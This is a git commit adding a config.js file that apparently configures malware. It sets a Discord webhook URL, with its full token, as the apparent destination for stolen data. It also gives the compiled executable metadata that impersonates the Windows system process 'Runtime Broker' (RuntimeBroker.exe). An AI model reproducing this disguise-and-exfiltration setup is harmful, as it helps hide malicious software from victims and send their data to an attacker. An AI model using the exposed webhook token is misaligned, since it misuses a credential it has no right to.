8faf30faf41655b0420eb1b6b29af6e276bbefdc
doenerlum69 <05gabbe.com@gmail.com>
2023-07-02 01:43:50 +0200

    Commit 1

---
+++ config.js
@@ -0,0 +1,12 @@
+module.exports = () => {
+    return {
+        webhook_url: "https://discord.com/api/webhooks/1121164231782441150/B1e7CzWbHb2S7dw1g3lgR_EwCqPFRPfK55OR_twTMPIjMvMEd2VuuV8x4htKoagBwt_J",
+        icon: './default.ico',
+        properties: {
+            FileDescription: 'Runtime Broker',
+            ProductName: 'Runtime Broker',
+            LegalCopyright: 'Runtime Broker ©️ 2023',
+            OriginalFilename: 'RuntimeBroker.exe'
+        }
+    }
+}
